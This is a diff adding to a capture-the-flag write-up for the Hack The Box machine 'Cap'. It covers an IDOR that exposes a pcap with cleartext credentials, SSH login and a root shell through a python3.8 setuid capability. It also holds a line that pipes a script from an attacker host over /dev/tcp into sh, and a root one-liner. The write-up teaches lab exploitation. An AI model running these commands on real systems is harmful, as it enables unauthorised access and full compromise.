@@ -2,7 +2,7 @@
 
 ### Challenge: FullPWN
 
-### Tools: Nmap,  
+### Tools: Nmap, FTP, SSH, Linpeas, Python
 
 
 Nmap scan shows port 80 and port 22 are open. Maybe we can grab some credentials from the http site and login through ssh.
@@ -141,3 +141,80 @@ HOP RTT      ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 147.02 seconds
 ```
+
+On the website we can see we are logged in as the user Nathan and we have a couple of different places to go. Lets start with the security snapshot.
+
+![image](https://user-images.githubusercontent.com/105310322/183150769-dfb7ac3d-884a-4299-acf6-161cc1cc971c.png)
+
+Here we can download a pcap file but right now it doesnt have any traffic, But if we look at the URL we can see http://10.129.110.186/data/1. If we change that 1 to a 0 we can get the previous pcap download!
+
+![image](https://user-images.githubusercontent.com/105310322/183151068-2c3e3391-19ae-4b12-b25e-49ebe5052a9b.png)
+
+After downloading the pcap file and opening it up in wireshark we find some cleartext credentials.
+
+![image](https://user-images.githubusercontent.com/105310322/183151371-1ac9a8ca-d2d7-4d9f-93b5-ea69d0465110.png)
+
+Nicely done now we can login through ssh and grab the user flag! (You can also get this flag through ftp by running ```console $ get user.txt -```, however you will not be able to retrieve the root flag)
+
+```console
+─[us-dedivip-1]─[10.10.14.93]─[htb-0xrogue@pwnbox-base]─[~]
+└──╼ [★]$ ssh nathan@10.129.110.186
+nathan@10.129.110.186's password: 
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)
+Last login: Fri Aug  5 19:29:30 2022 from 10.10.14.93
+nathan@cap:~$ ls
+user.txt
+nathan@cap:~$ cat user.txt
+e62962879f1dc62e87f32fe0c15f0596
+```
+
+Awesome but now we need to get the root flag, however we can't just waltz right in there. We are going to have to priveledge escalate. So lets run linpeas from Nathan's account.
+
+First lets download it from github. (This following URL also gives good info on how to run it)
+
+```console
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+```
+By inputting the following commands we can get it to run
+
+```console
+sudo nc -lvnp 80 < linpeas.sh #Host
+cat < /dev/tcp/10.10.10.10/80 | sh #Victim
+```
+The following output with linpeas reveals "/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip" as our way to priviledge exscalate. (for me this was highlighted in bright yellow so its hard to miss) The following URL to hacktricks also gives good info on how to abuse the setuid capability.
+
+```console
+╔══════════╣ Capabilities
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
+Current env capabilities:
+Current: =
+Current proc capabilities:
+CapInh:	0000000000000000
+CapPrm:	0000000000000000
+CapEff:	0000000000000000
+CapBnd:	0000003fffffffff
+CapAmb:	0000000000000000
+
+Parent Shell capabilities:
+0x0000000000000000=
+
+Files with capabilities (limited to 50):
+/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
+/usr/bin/ping = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
+```
+Run the python script and it will give us a root shell and the flag!
+
+```console
+nathan@cap:/bin$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+root@cap:/bin# ls
+root@cap:/bin# cd /root
+root@cap:/root# ls
+root.txt  snap
+root@cap:/root# cat root.txt
+b6af56f563c273361dbc6236d2489cf5
+```
+
+Congratulations on PWNing this box and I hope this writeup taught you something.
